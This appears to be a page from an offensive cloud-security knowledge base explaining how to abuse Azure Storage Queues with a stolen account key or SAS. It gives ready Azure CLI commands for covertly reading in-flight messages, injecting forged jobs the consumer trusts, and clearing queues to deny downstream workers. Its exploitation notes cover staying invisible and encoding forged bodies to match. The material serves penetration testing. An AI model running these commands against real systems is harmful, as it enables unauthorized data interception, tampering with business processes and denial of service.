---
title: "Storage Queues: reading and injecting queue messages"
order: 4
description: "Reading and writing Azure Storage Queues through account keys or SAS for message capture and injection."
keywords:
  - Storage Queues
  - account key
  - SAS
  - message
  - queue
---

# Storage Queues

Storage Queues are the simple queue service built into an Azure storage account, used to buffer work between application tiers. Because they live in the storage account, any **account key** or **SAS** that reaches the account (see [storage keys](../credentials/storage-keys.md)) also reaches its queues, letting you read the messages in flight, inject forged work the consumer will process, or clear a queue to deny the system behind it.

## Enumerating and accessing

```bash
az storage queue list --account-name <acct> --account-key <key> -o table
az storage message peek --queue-name <q> --account-name <acct> --account-key <key> --num-messages 10
```

## Reading, injecting, and clearing

```bash
# read work without dequeuing (peek leaves it for the real consumer)
az storage message peek --queue-name <q> --account-name <acct> --account-key <key> --num-messages 32

# inject a forged message the consumer trusts
az storage message put --queue-name <q> --content '{"job":"forged"}' \
  --account-name <acct> --account-key <key>

# clear the queue to deny the downstream worker
az storage message clear --queue-name <q> --account-name <acct> --account-key <key>
```

## Exploitation notes

- `peek` does not dequeue or set a visibility timeout, so reading is invisible to the consumer; `get` would hide the message for its timeout window.
- Base64 is the default encoding many SDKs use, so decode peeked content before reading and encode forged bodies to match what the consumer expects.
- A storage account key is often recovered from [app settings](../credentials/app-settings-and-connection-strings.md) or a connection string, so queue access usually comes for free with storage compromise.

## Tools

- **Azure CLI** (`az storage message` / `az storage queue`).
- **Azure Storage Explorer**: GUI read and inject.
- **MicroBurst**: surfaces storage account keys and connection strings from configuration.

## References

- [HackTricks Cloud: Azure Storage](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [NetSPI: MicroBurst](https://github.com/NetSPI/MicroBurst)
- [Microsoft: Queue Storage authorization](https://learn.microsoft.com/azure/storage/queues/authorize-data-operations-cli)
